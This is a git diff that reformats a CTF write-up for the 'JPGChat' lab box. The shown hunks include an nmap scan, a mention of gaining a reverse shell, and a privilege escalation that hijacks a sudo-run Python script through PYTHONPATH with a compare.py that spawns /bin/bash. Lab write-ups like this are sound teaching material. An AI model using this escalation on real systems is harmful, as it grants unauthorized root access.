@@ -1,6 +1,6 @@
-##JPGChat
+## JPGChat
 
-#Enumeration
+# Enumeration
 ```
 # Nmap 7.91 scan initiated Sun Feb 28 13:57:44 2021 as: nmap -sC -sV -o nmap/initial -vvv -p 22,3000 10.10.236.124
 Nmap scan report for 10.10.236.124
@@ -43,7 +43,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Sun Feb 28 13:57:58 2021 -- 1 IP address (1 host up) scanned in 13.29 seconds
 ```
 
-#Port 3000
+# Port 3000
 Welcome to JPChat
 the source code of this service can be found at our admin's github
 MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
@@ -101,7 +101,7 @@ name
 ```
 And we have a reverse shell on our awaiting listener, We stabilize our shell and are the user wes. We can find the user flag in /home/wes/user.txt
 
-#Privilege Escalation
+# Privilege Escalation
 ```
 sudo -l
 Matching Defaults entries for wes on ubuntu-xenial:
@@ -120,8 +120,11 @@ from compare import *
 print(compare.Str('hello', 'hello', 'hello'))
 ```
 We can't directly write to this file or the directory so a direct code injection or in directory library hijack is not possible. However, because of the env_keep+=PYTHONPATH we can adjust this to a directory we can write to, such as  /home/wes, /dev/shm, /tmp, etc... and place a compare.py with our escalation payload 
+ ```
 import os
 os.system("/bin/bash")
+```
+
 we then execute the following
 ```
 export PYTHONPATH="/dev/shm"
